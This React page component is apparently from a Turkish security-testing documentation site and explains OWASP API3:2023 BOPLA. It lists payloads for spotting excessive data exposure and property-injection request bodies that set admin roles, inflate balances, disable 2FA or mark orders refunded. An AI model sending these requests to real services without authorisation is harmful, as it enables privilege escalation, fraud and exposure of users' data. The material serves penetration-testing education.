"use client"

import { motion } from "framer-motion"
import { Server, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function BOPLAPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
          <Server className="w-4 h-4" />
          <span>API Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">BOPLA (Broken Object Property Level Authorization)</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          API&apos;lerde nesne özelliklerine yetkisiz erişim. OWASP API3:2023 olarak üçüncü sırada.
          Excessive data exposure ve mass assignment zafiyetlerini kapsar.
        </p>
      </motion.div>

      <Callout type="info" title="OWASP API3:2023">
        BOPLA, eski API3 (Excessive Data Exposure) ve API6 (Mass Assignment)&apos;ı birleştirir.
        API response&apos;da gereksiz field&apos;lar döndürülmesi veya input&apos;ta yetkisiz field&apos;lar kabul edilmesi.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Excessive Data Exposure</h2>
        <p className="text-muted-foreground mb-4">
          API response&apos;unda döndürülmemesi gereken hassas verileri tespit edin.
          Client-side filtering güvenlik sağlamaz.
        </p>
        <PayloadList
          title="Data Exposure Detection"
          initialShow={8}
          payloads={[
            { code: `GET /api/users/me → response'da password_hash field'ı`, note: "Parola hash sızıntısı" },
            { code: `GET /api/users/me → response'da ssn, credit_card`, note: "Kişisel veri ifşası" },
            { code: `GET /api/users/me → response'da internal_id, created_by`, note: "İç veri sızıntısı" },
            { code: `GET /api/users/me → response'da is_admin, role, permissions`, note: "Yetki bilgisi sızıntısı" },
            { code: `GET /api/users/me → response'da api_key, secret_key`, note: "API anahtarı ifşası" },
            { code: `GET /api/users/me → response'da email, phone (diğer kullanıcılar)`, note: "Diğer kullanıcıların kişisel verileri" },
            { code: `GET /api/users?fields=password,ssn,credit_card`, note: "Field seçimi kötüye kullanımı" },
            { code: `GET /api/users?include=sensitive_data`, note: "Include parametresi" },
            { code: `GET /api/users?expand=all`, note: "Expand parametresi" },
            { code: `GET /api/users?verbose=true`, note: "Verbose modu" },
            { code: `GET /api/users?debug=true`, note: "Debug modu" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Property Injection</h2>
        <p className="text-muted-foreground mb-4">
          Request body&apos;ye ek property&apos;ler ekleyerek yetkisiz değişiklik yapma.
          API dokümantasyonunda olmayan field&apos;ları deneyin.
        </p>
        <PayloadList
          title="Property Injection Payloads"
          initialShow={8}
          payloads={[
            { code: `PUT /api/users/me {"name":"test","role":"admin"}`, note: "Rol enjeksiyonu" },
            { code: `PUT /api/users/me {"name":"test","is_admin":true}`, note: "Admin bayrağı" },
            { code: `PUT /api/users/me {"name":"test","verified":true}`, note: "Doğrulama bypass" },
            { code: `PUT /api/users/me {"name":"test","balance":999999}`, note: "Bakiye manipülasyonu" },
            { code: `PUT /api/users/me {"name":"test","discount":100}`, note: "İndirim enjeksiyonu" },
            { code: `PUT /api/users/me {"name":"test","subscription":"premium"}`, note: "Plan yükseltme" },
            { code: `PUT /api/users/me {"name":"test","email_verified":true}`, note: "Email doğrulama bypass" },
            { code: `PUT /api/users/me {"name":"test","2fa_enabled":false}`, note: "2FA devre dışı bırakma" },
            { code: `PUT /api/users/me {"name":"test","permissions":["admin","write","delete"]}`, note: "Yetki enjeksiyonu" },
            { code: `PUT /api/users/me {"name":"test","org_id":"other_org"}`, note: "Organizasyon değiştirme" },
            { code: `PATCH /api/orders/123 {"status":"refunded","amount":0}`, note: "Sipariş manipülasyonu" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Response Comparison</h2>
        <PayloadList
          title="Response Analiz Teknikleri"
          initialShow={6}
          payloads={[
            { code: `GET /api/users/me vs GET /api/admin/users/me`, note: "Endpoint response farkı" },
            { code: `Accept: application/json vs Accept: application/xml`, note: "Format değiştirme - farklı field'lar" },
            { code: `GET /api/v1/users/me vs GET /api/v2/users/me`, note: "Versiyon farkı" },
            { code: `GET /api/users/me?format=detailed`, note: "Detaylı format" },
            { code: `GET /api/users/me (normal) vs GET /api/users/me (admin token)`, note: "Token bazlı fark" },
            { code: `Mobile app API vs Web API response karşılaştırma`, note: "Platform farkı" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. Tüm API response&apos;larını hassas veri için inceleyin{"\n"}
        2. PUT/PATCH request&apos;lere ek field&apos;lar ekleyin{"\n"}
        3. API dokümantasyonundaki field&apos;ları response ile karşılaştırın{"\n"}
        4. GraphQL introspection ile tüm field&apos;ları keşfedin{"\n"}
        5. Farklı API versiyonlarını karşılaştırın
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/api/broken-auth" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>Broken Authentication</span>
        </Link>
        <Link href="/docs/api/mass-assignment" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>Mass Assignment</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
